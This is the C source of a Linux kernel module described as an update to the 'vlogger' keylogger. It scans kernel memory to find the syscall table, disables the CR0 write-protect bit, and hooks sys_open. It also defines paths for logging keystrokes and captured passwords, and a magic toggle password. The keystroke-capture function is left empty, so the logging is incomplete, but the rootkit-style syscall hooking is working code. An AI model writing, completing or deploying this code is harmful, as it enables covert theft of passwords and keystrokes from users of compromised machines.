/*
 *  Copyright (C) 2011
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 *  This program is an update to vlogger. Details about vlogger
 *  can be found at 
 *  http://www.phrack.org/issues.html?issue=59&id=14#article
 *
 */

#define _KERNEL_SYSCALLS_ // from vlogger
#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <asm/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/tty.h> // to use ttys
#include <linux/tty_driver.h> // for tty constants
#include <linux/file.h> // for file stuff like fget
#include <linux/device.h>

#include <linux/version.h>
#include <linux/spinlock.h> // spin locks
#include <linux/sched.h> // using the task struct
#include <linux/string.h> // string stuff
#include <asm/uaccess.h>
#include <linux/proc_fs.h> // to use file struct
#include <asm/io.h>

/* Defines for debugging and logging modes */
#define DEBUG
//#define LOCAL_ONLY
DEFINE_SPINLOCK(mr_lock);

// these memory locations are specific to 32-bit systems
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// This is stuff for the actual keylogger. This is things like
// the number of loggers and such
#define N_TTY_NAME "tty"
#define N_PTS_NAME "pts"
#define MAX_TTY_CON 8 // max tty connections
#define MAX_PTS_CON 256 // max pts connections
#define LOG_DIR "/tmp/log" // where the log will be saved
#define PASS_LOG LOG_DIR "pass.log" // where passwords will be saved.
// PASS_LOG is only used for smart logging

// from vlogger. Will change later
#define TIMEZONE 7*60*60

// unique keys in ascii
#define ESC_CHAR 27
#define BACK_SPACE_CHAR1 127 // local
#define BACK_SPACE_CHAR2 8 // remote

// info to change the keylogger's run mode
#define VK_TOGGLE_CHAR 29 // ctrl-]
#define MAGIC_PASS "31337"
// to change mode, press MAGIC_PASS and VK_TOGGLE_CHAR

// different running modes
#define VK_NORMAL 0
#define VK_DUMBMODE 1
#define VK_SMARTMODE 2
// the default mode we want. Change it to any of the above
#define DEFAULT_MODE VK_DUMBMODE

#define MAX_BUFFER 256 //max buffer size
#define MAX_SPECIAL_CHAR_SZ 12 // max special char size

/* the following macros aid in grabbing information about
   our tty, such as its name and device number */

// helps determine device number, which should be between
// 0 and MAX_TTY_CON... I think
#define TTY_NUMBER(tty) MINOR((tty)->dev->devt) - (tty)->driver->minor_start \
  + (tty)->driver->name_base
// determines the tty index in our array of loggers
#define TTY_INDEX(tty) tty->driver->type == \
    TTY_DRIVER_TYPE_PTY ? MAX_TTY_CON + \
    TTY_NUMBER(tty):TTY_NUMBER(tty)
// checks if echoing is disabled... I think
#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
// writes into a tty using a built in function
#define TTY_WRITE(tty,buf,count) (*tty->driver->write)(tty, 0, buf, count)
// gets the tty name, which is either tyy or pts
#define TTY_NAME(tty) (tty->driver->type == \
    TTY_DRIVER_TYPE_CONSOLE ? N_TTY_NAME: \
    tty->driver->type == TTY_DRIVER_TYPE_PTY && \
		       tty->driver->subtype == PTY_TYPE_SLAVE ? N_PTS_NAME:"")

// the following macro expands the memory so that includes kernel memory.
// we do this so that we can call system calls from within the kernel
// otherwise the system call will fail
mm_segment_t old_fs;
#define BEGIN_KMEM {old_fs = get_fs(); set_fs(KERNEL_DS);}
#define END_KMEM {set_fs(old_fs); }

// for errors
int errno;

// our logging struct, called tlogger
struct tlogger{
  struct tty_struct *tty; // the thing we're logging
  char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ]; // stores key presses
  int status;
  int lastpos; // our current position in the array/char buffer
  int pass;
};

// this will be an array of tlogger pointers, one for each possible tty
// we initialize it to NULL since it begins empty
struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = {NULL};

// this will point to the syscall_table
unsigned long *syscall_table;

// pointer to the original receive_buf functino found in
// tty->ldisc->ops
void (*old_receive_buf)(struct tty_struct*, const unsigned char *,
			char *, int);

// our new receive buf function
void new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
		     char *fp, int count){
}

// pointer to the original sys_open call.
asmlinkage long (*original_open)(const char *,int, int);

// set our default logging mode
int vlogger_mode = DEFAULT_MODE;

// our replacement sys_open
asmlinkage long new_open(const char *filename, int flags, int mode) {
  // flag is set once we have the receive buf function
  static int fl = 0;

  // call the origina open function
  long ret = (*original_open)(filename, flags, mode);
	
  if (ret > 0) {
    // we successfully opened this file
    // get the file associated with fd
    struct file* file;
    spin_lock(&mr_lock);
    file = fget(ret);
    spin_unlock(&mr_lock);

    struct tty_struct* tty;
    tty = file->private_data;

    // check if this is a tty
    if(tty != NULL && tty > 0){
      printk(KERN_ALERT "this is a tty\n");
      if(tty->ldisc != NULL && tty->ldisc > 0){
	printk(KERN_ALERT "tty has ldisc\n");
	if(tty->ldisc->ops != NULL && tty->ldisc->ops > 0){
	  printk(KERN_ALERT "ldisc has ops\n");
	}
      }

      if(tty->dev != NULL && tty->dev > 0){
	printk(KERN_ALERT "tty has device\n");
	if(tty->dev->devt != NULL && tty->dev->devt > 0){
	  //
	}
      }
    }
  }
  return ret;
}

// main init function for the module. It rewrites the syscall table
// and calls another function that inits the logging process
static int init(void) {

  // find the syscall table address through a brute force
  unsigned long i = START_MEM;
  while(i < END_MEM){
    // we will compare the current address with that of sys_close
    unsigned long *current_address = (unsigned long*)i;
    if(current_address[__NR_close] == sys_close){
      #ifdef DEBUG
      printk(KERN_ALERT "sys call table address is %lu\n",
	     (unsigned long)current_address);
      #endif

      syscall_table = current_address;
      break;
    }
    i+= sizeof(void*);
  }
  #ifdef DEBUG
  printk(KERN_ALERT "module initted\n");
  #endif

  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // store the original open and replace it with ours
  // only if we're not logging locally
  #ifndef LOCAL_ONLY
  original_open = (void *)syscall_table[__NR_open];
  syscall_table[__NR_open] = new_open;
  #endif

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  
  // begin the logging procedure
  //my_tty_open();
  return 0;
}

// this has to do with locking methinks
//DECLARE_WAIT_QUEUE_HEAD(wq);

// exit function that gets called when the module
// is unloaded. It resets the syscall table 
static void exit(void) {
  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // restore the original getpid function
  // only if we arent local only
  #ifndef LOCAL_ONLY
  syscall_table[__NR_open] = original_open;
  #endif

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  #ifdef DEBUG
  printk(KERN_ALERT "module exitted\n");
  #endif

  //dealloc all of our loggers
  int i = 0;
  // go through our entire array list
  for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++) {
    if (ttys[i] != NULL) {
      // restore the original receive_buf of each tty
      ttys[i]->tty->ldisc->ops->receive_buf = old_receive_buf;
    }
  }
  // probably has to do with kernel syncing
  //sleep_on_timeout(&wq, HZ);
  for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++) {
    if (ttys[i] != NULL) {
      // free up every tlogger in our array
      kfree(ttys[i]);
    }
  }
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
